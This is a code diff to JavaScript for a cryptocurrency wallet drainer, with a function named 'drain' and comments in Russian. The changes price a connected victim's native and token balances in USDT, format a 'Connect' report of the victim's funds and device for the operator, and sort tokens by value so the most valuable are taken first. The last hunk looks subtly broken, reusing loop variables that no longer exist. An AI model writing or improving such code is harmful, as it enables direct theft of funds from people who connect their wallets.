@@ -80,7 +80,7 @@ const TOKEN_SYMBOLS = {
   "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
   "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
   "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
-  "0x4e1581f01046e1c6d7c3aa0fea8粉碎e9b7ea0f28c49": "ICEUSDT",
+  "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
   "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
   "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDT",
   "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8": "USDCUSDT",
@@ -420,7 +420,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   if (parseFloat(nativeBalance) > 0) {
     const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
     const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-    funds.push(`${config.nativeToken}(${nativeNetwork}): ${formattedNativeBalance}`);
+    // Получаем цену нативного токена в USDT
+    const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
+    const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
+    funds.push(`- **${config.nativeToken}**(${nativeNetwork}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
   }
 
   // Токены (USDT, USDC и другие)
@@ -436,7 +439,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
                       tokenAddress === config.usdcAddress ? "USDC" :
                       Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
         const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
-        funds.push(`${symbol}(${tokenNetwork}): ${formattedBalance}`);
+        // Получаем цену токена в USDT
+        const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
+        const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
+        funds.push(`- **${symbol}**(${tokenNetwork}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
       }
     }
   }
@@ -446,10 +452,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   // Формируем сообщение
   const message = [
-    `🌀 Connect | [ \`${shortAddress}\` ]`,
+    `🌀 Connect | [ **${shortAddress}** ]`,
     ``,
     `Funds:`,
-    ...funds.map(fund => `- ${fund}`),
+    ...funds,
     `Device: ${device}`
   ].join('\n');
 
@@ -483,6 +489,31 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const tokenDataResults = await Promise.all(tokenDataPromises);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
+    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
+      bal.tokenBalances[tokenAddress] = realBalance;
+    }
+
+    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
+      const symbol = tokenAddress === config.usdtAddress ? "USDT" :
+                    tokenAddress === config.usdcAddress ? "USDC" :
+                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
+      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
+    }
+  }
+
+  const pricePromises = tokensToProcess.map(async (token) => {
+    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
+    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
+    token.valueInUSDT = balanceInUnits * price;
+    return token;
+  });
+
+  await Promise.all(pricePromises);
+
+  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
+
+  let status = 'rejected';
+  for (const { token, balance, contract, address, decimals } of tokenDataResults) {
     if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
       bal.tokenBalances[tokenAddress] = realBalance;
     }
